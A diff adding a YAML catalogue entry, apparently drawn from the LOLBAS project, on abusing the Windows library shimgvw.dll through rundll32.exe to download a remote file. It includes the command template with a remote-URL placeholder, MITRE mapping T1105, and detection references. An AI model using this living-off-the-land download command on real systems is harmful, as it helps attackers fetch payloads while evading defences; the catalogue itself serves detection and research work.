@@ -1,0 +1,95 @@
+id: lolbas/T1NMaWJyYXJpZXMvU2hpbWd2dy55bWw/RG93bmxvYWQ/0
+type: library
+platform: windows
+name: Shimgvw.dll
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the
+    command line
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
+commands:
+- template: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
+  comment: Once executed, rundll32.exe will download the file at the URL in the command to INetCache.
+    Can also be used with entrypoint 'ImageView_FullscreenA'.
+references:
+- https://lolbas-project.github.io/lolbas/Libraries/Shimgvw/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Shimgvw.dll
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSLibraries/Shimgvw.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Shimgvw.dll\nDescription: Photo Gallery Viewer\nAuthor: Eral4m\nCreated:\
+        \ 2021-01-06\nCommands:\n  - Command: rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen\
+        \ {REMOTEURL:.exe}\n    Description: Once executed, rundll32.exe will download the file at the\
+        \ URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.\n\
+        \    Usecase: Download file from remote location.\n    Category: Download\n    Privileges: User\n\
+        \    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Download:\
+        \ INetCache\nFull_Path:\n  - Path: c:\\windows\\system32\\shimgvw.dll\n  - Path: c:\\windows\\\
+        syswow64\\shimgvw.dll\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml\n\
+        \  - IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://')\
+        \ on the command line\nResources:\n  - Link: https://twitter.com/eral4m/status/1479080793003671557\n\
+        Acknowledgement:\n  - Person: Eral4m\n    Handle: '@eral4m'\n"
+      document_sha256: sha256:3b9c549601033711ac84f9672268cc1e4bfcafdf04c6b0e910bf56f79220b184
+    upstream_url: https://lolbas-project.github.io/lolbas/Libraries/Shimgvw/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:61409829ed28df45959f3f541316c5fca20866269b69cc754b8ed6b1b5222cd6
